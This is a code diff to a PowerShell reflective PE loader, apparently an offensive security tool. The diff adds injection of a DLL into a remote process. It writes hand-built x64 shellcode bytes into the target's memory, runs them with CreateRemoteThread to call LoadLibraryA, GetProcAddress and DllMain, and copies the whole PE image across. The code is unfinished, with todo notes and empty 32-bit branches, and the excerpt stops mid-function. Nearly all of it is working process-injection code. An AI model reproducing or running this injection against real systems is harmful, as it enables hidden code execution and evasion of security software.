@@ -540,6 +540,11 @@ $RemoteScriptBlock = {
 		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
 		
+		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
+		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
+		
 		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
 		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [Ref]) ([Bool])
 		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
@@ -559,6 +564,26 @@ $RemoteScriptBlock = {
 	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
 	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
+		
+		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
+	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
+		
+		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
+        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+		
+		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
+        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
+		
+		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
+        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
 		
 		return $Win32Functions
 	}
@@ -1055,6 +1080,247 @@ $RemoteScriptBlock = {
 		
 		return $PEInfo
 	}
+	
+	
+	Function Import-DllInRemoteProcess
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=$true)]
+		[IntPtr]
+		$RemoteProcHandle,
+		
+		[Parameter(Position=1, Mandatory=$true)]
+		[IntPtr]
+		$ImportDllPathPtr
+		)
+		
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		
+		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
+		$DllPathSize = [UIntPtr]([UInt64]$ImportDllPath.Length + 1)
+		$RemoteMemAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		if ($RemoteMemAddr -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to allocate memory in the remote process"
+		}
+
+		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
+		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RemoteMemAddr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
+		
+		if ($Success -eq $false)
+		{
+			Throw "Unable to write DLL path to remote process memory"
+		}
+		if ($DllPathSize -ne $NumBytesWritten)
+		{
+			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
+		}
+		
+		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
+		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
+		
+		
+		#Allocate memory for the address returned by LoadLibraryA
+		#todo free this
+		$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
+		}
+		
+		
+		#Write Shellcode to the remote process which will call LoadLibraryA
+		[Byte[]]$GetProcAddressSC = @() #todo change var name for this and everyting below
+		if ($PEInfo.PE64Bit -eq $true)#todo need x86 code
+		{
+			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+			$GetProcAddressSC2 = @(0x48, 0xba)
+			$GetProcAddressSC3 = @(0xff, 0xd2, 0x48, 0xba)
+			$GetProcAddressSC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+		}
+		else
+		{
+		}
+		
+		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + ($PtrSize * 3)
+		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
+		$SCPSMemOriginal = $SCPSMem
+		
+		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteMemAddr, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
+
+		
+		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+		if ($RSCAddr -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to allocate memory in the remote process for shellcode"
+		}
+		Write-Debug "Address of LoadLibraryA calling shellcode in remote process: $RSCAddr"
+		
+		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
+		{
+			Throw "Unable to write shellcode to remote process memory."
+		}
+		
+		$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
+		if ($Result -ne 0)
+		{
+			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+		}
+		
+		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
+		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
+		if ($Result -eq $false)
+		{
+			Throw "Call to ReadProcessMemory failed"
+		}
+		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [IntPtr])
+		Write-Debug "todo DllAddress: $ProcAddress"
+		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RemoteMemAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+		
+		return $ProcAddress #todo bad variable name
+	}
+	
+	
+	Function Get-RemoteProcAddress
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=$true)]
+		[IntPtr]
+		$RemoteProcHandle,
+		
+		[Parameter(Position=1, Mandatory=$true)]
+		[IntPtr]
+		$RemoteDllHandle,
+		
+		[Parameter(Position=2, Mandatory=$true)]
+		[String]
+		$FunctionName
+		)
+		Write-Debug "todo $FunctionName"
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName) #todo free this
+		
+		#Write FunctionName to memory (will be used in GetProcAddress)
+		$FunctionNameSize = [UIntPtr]([UInt64]$FunctionName.Length + 1)
+		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		if ($RFuncNamePtr -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to allocate memory in the remote process"
+		}
+
+		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
+		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
+		
+		if ($Success -eq $false)
+		{
+			Throw "Unable to write DLL path to remote process memory"
+		}
+		if ($FunctionNameSize -ne $NumBytesWritten)
+		{
+			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
+		}
+		
+		#Get address of GetProcAddress
+		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
+		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes
+
+		
+		#Allocate memory for the address returned by GetProcAddress
+		#todo free this
+		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
+		}
+		
+		
+		#Write Shellcode to the remote process which will call GetProcAddress
+		[Byte[]]$GetProcAddressSC = @()
+		if ($PEInfo.PE64Bit -eq $true)#todo need x86 code
+		{
+			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+			$GetProcAddressSC2 = @(0x48, 0xba)
+			$GetProcAddressSC3 = @(0x48, 0xb8)
+			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
+			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+		}
+		else
+		{
+		}
+		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
+		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
+		$SCPSMemOriginal = $SCPSMem
+		
+		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
+		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
+		
+		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+		if ($RSCAddr -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to allocate memory in the remote process for shellcode"
+		}
+		Write-Debug "Address of GetProcAddress calling shellcode in remote process: $RSCAddr"
+		
+		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
+		{
+			Throw "Unable to write shellcode to remote process memory."
+		}
+		
+		$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
+		if ($Result -ne 0)
+		{
+			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+		}
+		
+		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
+		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
+		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
+		{
+			Throw "Call to ReadProcessMemory failed"
+		}
+		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [IntPtr])
+		Write-Debug "todo ProcAddress: $ProcAddress"
+		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+		
+		return $ProcAddress
+	}
+
 
 	Function Copy-Sections
 	{
@@ -1240,8 +1506,18 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 3, Mandatory = $true)]
 		[System.Object]
-		$Win32Constants
+		$Win32Constants,
+		
+		[Parameter(Position = 4, Mandatory = $false)]
+		[IntPtr]
+		$RemoteProcHandle
 		)
+		
+		$RemoteLoading = $false
+		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
+		{
+			$RemoteLoading = $true
+		}
 		
 		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
 		{
@@ -1262,8 +1538,18 @@ $RemoteScriptBlock = {
 					break
 				}
 
-				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
-				$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
+				$ImportDllHandle = [IntPtr]::Zero
+				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
+				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
+				
+				if ($RemoteLoading -eq $true)
+				{
+					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
+				}
+				else
+				{
+					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
+				}
 
 				if ($ImportDllHandle -eq $null)
 				{
@@ -1284,14 +1570,21 @@ $RemoteScriptBlock = {
 					[IntPtr]$NewThunkRef = [IntPtr]::Zero
 					if([Int64]$OriginalThunkRefVal -lt 0)
 					{
-						$FuncOrdinal = [Int64]$OriginalThunkRefVal -band 0xffff
-						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $FuncOrdinal)
+						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
 					}
 					else
 					{
 						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
 						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([UInt16]))
 						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
+					}
+					
+					if ($RemoteLoading -eq $true)
+					{
+						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
+					}
+					else
+					{
 						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
 					}
 					
@@ -1768,6 +2061,8 @@ $RemoteScriptBlock = {
 		$RemoteProcHandle
 		)
 		
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		
 		#Get Win32 constants and functions
 		$Win32Constants = Get-Win32Constants
 		$Win32Functions = Get-Win32Functions
@@ -1797,7 +2092,7 @@ $RemoteScriptBlock = {
 		{
 			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
 			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
-			if ($Result -ne [IntPtr]::Zero)
+			if ($Result -eq [IntPtr]::Zero)
 			{
 				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit" #todo might need to change this in the future
 			}
@@ -1892,30 +2187,104 @@ $RemoteScriptBlock = {
 		
 		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
 		Write-Verbose "Import DLL's needed by the PE we are loading"
-		Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
-		
-		
-		#Update the memory protection flags for all the memory just allocated
-		if ($NXCompatible -eq $true)
+		if ($RemoteLoading -eq $true)
 		{
-			Write-Verbose "Update memory protection flags"
-			Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
+			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
 		}
 		else
 		{
-			Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
+			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+		}
+		
+		
+		#Update the memory protection flags for all the memory just allocated
+		if ($RemoteLoading -eq $false)
+		{
+			if ($NXCompatible -eq $true)
+			{
+				Write-Verbose "Update memory protection flags"
+				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
+			}
+			else
+			{
+				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
+			}
+		}
+		else
+		{
+			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
+		}
+		
+		
+		#If remote loading, copy the DLL in to remote process memory
+		[UInt32]$NumBytesWritten = 0
+		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]$PEInfo.SizeOfImage, [Ref]$NumBytesWritten)
+		if ($Success -eq $false)
+		{
+			Throw "Unable to write shellcode to remote process memory."
 		}
 		
 		
 		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
 		if ($PEInfo.FileType -ieq "DLL")
 		{
-			Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
-			$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-			$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
-			$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+			if ($RemoteLoading -eq $false)
+			{
+				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
+				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+				
+				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
+			}
+			else
+			{
+				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 			
-			$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
+				#todo write x86
+				if ($PEInfo.PE64Bit -eq $true)
+				{
+					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
+					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+				}
+				
+				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
+				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
+				$SCPSMemOriginal = $SCPSMem
+				
+				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
+				
+				#todo free this
+				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+				if ($RSCAddr -eq [IntPtr]::Zero)
+				{
+					Throw "Unable to allocate memory in the remote process for shellcode"
+				}
+				Write-Debug "Address of DllMain calling shellcode in remote process: $RSCAddr"
+				
+				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
+				{
+					Throw "Unable to write shellcode to remote process memory."
+				}
+				
+				$RThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr]::Zero, $RSCAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
+				if ($Result -ne 0)
+				{
+					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+				}
+			}
 		}
 		elseif ($PEInfo.FileType -ieq "EXE")
 		{
@@ -1947,7 +2316,7 @@ $RemoteScriptBlock = {
 			}
 		}
 		
-		return ($PEInfo.PEHandle)
+		return @($PEInfo.PEHandle, $EffectivePEHandle)
 	}
 	
 	
@@ -2060,21 +2429,24 @@ $RemoteScriptBlock = {
 		$PEHandle = [IntPtr]::Zero
 		if ($RemoteProcHandle -eq [IntPtr]::Zero)
 		{
-			$PEHandle = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
 		}
 		else
 		{
-			$PEHandle = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
+			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
 		}
-		if ($PEHandle -eq [IntPtr]::Zero)
+		if ($PELoadedInfo -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to load PE, handle returned is NULL"
 		}
 		
+		$PEHandle = $PELoadedInfo[0]
+		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		
 		
 		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-		if ($PEInfo.FileType -ieq "DLL")
+		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))   #todo deal with remote situation
 		{
 			#########################################
 			### YOUR CODE GOES HERE
@@ -2125,8 +2497,36 @@ $RemoteScriptBlock = {
 			### END OF YOUR CODE
 			#########################################
 		}
+		#For remote DLL injection, call a void function which takes no parameters
+		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
+		{
+			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
+			if ($VoidFuncAddr -eq $null)
+			{
+				Throw "VoidFunc couldn't be found in the DLL"
+			}
+			
